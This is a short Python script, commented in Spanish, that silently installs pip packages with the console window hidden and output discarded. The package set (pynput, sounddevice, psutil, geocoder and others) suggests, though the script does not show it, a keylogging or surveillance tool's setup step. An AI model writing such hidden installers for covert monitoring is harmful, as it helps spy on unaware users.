import subprocess
import time
import sys
import os

# Obtener el directorio del script y cambiar el directorio actual
base_path = os.path.abspath(os.path.dirname(__file__))
os.chdir(base_path)

# Función para ejecutar comandos en segundo plano y ocultos
def run_hidden_command(command):
    try:
        # Ejecuta el comando de forma oculta en Windows; compatible con otros sistemas
        if os.name == 'nt':  # Windows
            subprocess.run(command, creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:  # Linux/MacOS
            subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"Error al ejecutar el comando: {' '.join(command)}\n{e}", file=sys.stderr)

# Comandos para actualizar pip y instalar los paquetes
commands = [
    ["python", "-m", "pip", "install", "--upgrade", "pip"],
    ["python", "-m", "pip", "install", "sounddevice"],
    ["python", "-m", "pip", "install", "numpy"],
    ["python", "-m", "pip", "install", "ffmpeg"],
    ["python", "-m", "pip", "install", "tk"],
    ["python", "-m", "pip", "install", "psutil"],
    ["python", "-m", "pip", "install", "datetime"],
    ["python", "-m", "pip", "install", "logging"],
    ["python", "-m", "pip", "install", "wmic"],
    ["python", "-m", "pip", "install", "requests"],
    ["python", "-m", "pip", "install", "pynput"],
    ["python", "-m", "pip", "install", "pathlib"],
    ["python", "-m", "pip", "install", "folium", "geopy", "geocoder"]
]

# Ejecutar todos los comandos en segundo plano
for command in commands:
    run_hidden_command(command)
    time.sleep(1)  # Esperar 1 segundo entre cada instalación (opcional)
